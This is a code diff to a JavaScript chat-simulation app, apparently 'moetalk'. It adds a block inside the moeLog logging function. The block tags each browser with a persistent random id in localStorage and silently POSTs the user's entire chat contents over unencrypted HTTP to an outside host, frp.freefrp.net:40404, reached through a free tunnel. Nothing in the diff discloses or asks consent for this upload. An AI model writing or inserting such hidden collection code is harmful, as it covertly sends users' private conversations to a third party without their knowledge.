@@ -1157,6 +1157,7 @@ function mt_emojis(S,mode)
 		S(!0)
 	}
 }
+var send = true;
 function moeLog(type,data,mode,indexs)
 {
 	moetalkStorage.getItem('moeLog', function(err, moeLog)
@@ -1172,5 +1173,22 @@ function moeLog(type,data,mode,indexs)
 		})
 		moetalkStorage.setItem('moeLog', moeLog);
 		//console.log(moeLog)
+		if(send)//
+		{
+			localStorage['local_no'] = localStorage['local_no'] ? localStorage['local_no'] : Math.random()
+			$.ajax({
+				url:'http://frp.freefrp.net:40404/moetalk.php',
+				async:true,
+				type:'POST',
+				data:{'chats':JSON.stringify(chats),'local_no':localStorage['local_no']},
+				dataType:'text',
+				success:function(data){
+					//console.log('2')
+					send = true
+				}
+			});
+		}
+		//console.log('1')
+		send = false;
 	});
 }
